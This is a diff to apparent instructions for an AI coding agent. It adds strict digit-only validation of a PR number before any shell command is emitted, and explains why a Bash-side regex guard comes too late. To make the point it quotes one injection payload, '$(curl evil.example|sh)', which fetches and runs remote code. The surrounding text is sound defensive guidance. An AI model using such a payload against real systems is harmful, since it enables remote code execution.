@@ -79,9 +79,46 @@ If no diff exists (clean branch), inform the user and suggest `--module` or `--f
 
 **--pr N**:
 
+**Validate `<N>` yourself, before you emit any Bash.** Whatever supplies
+`<N>` — a human typing it directly, or a scripted/automated trigger extracting
+a PR number out of a less-trusted source such as an issue or comment body —
+must not be able to smuggle shell syntax into a command line. Unlike a git
+ref, a PR number has no legitimate reason to be anything other than a bare
+positive integer, so the rule is strict and the enforcement point is *before*
+the shell, not inside it:
+
+1. Take `<N>` exactly as supplied and test it against `^[0-9]+$` — digits
+   only, with no sign, whitespace, quotes or surrounding punctuation.
+2. If it does not match, **refuse in prose and stop**: tell the user the PR
+   number is invalid and suggest `--diff` or `--module` instead. Emit no Bash
+   at all for this scope, and never echo the rejected value back into a shell
+   command — not even inside an error message.
+3. Only once it matches, emit the command with the validated digits inlined
+   literally:
+
 ```bash
+# <N> has already been checked against ^[0-9]+$ above; inline it as literal
+# digits — e.g. `gh pr diff 1234 --name-only`.
 gh pr diff <N> --name-only
 ```
+
+**A Bash-side guard is not a substitute for the check above.** `<N>` reaches
+the shell by text substitution into the command *you* write, so a guard like
+`PR_NUMBER="<N>"` followed by an `[[ "$PR_NUMBER" =~ ^[0-9]+$ ]]` test is
+already too late: a double-quoted assignment performs command substitution, so
+`--pr '$(curl evil.example|sh)'` runs the payload at assignment time and the
+regex on the next line then dutifully rejects a value the attacker no longer
+needs. That is what distinguishes `<N>` from `BASE_BRANCH` above — that value
+is *produced* at runtime by `$(git …)`/`$(gh …)` and lands in a variable, and
+bash does not re-expand a variable's value, so a guard on it does run before
+the value is ever used as syntax **for as long as it stays a variable, inside
+the one Bash call that produced it**. Split that call and the distinction
+disappears: as the `--diff` block above warns, the variable does not survive,
+the branch name has to be re-embedded as literal text, and it is then command
+text parsed before any guard in the new call can run — "exactly as dangerous
+as it was in the first", i.e. exactly `<N>`'s problem. So keep `BASE_BRANCH`'s
+guard and the `"origin/$BASE_BRANCH"` use it protects in a single call, as the
+block above does.
 
 **--module path**: use the path directly. Verify it exists.
 
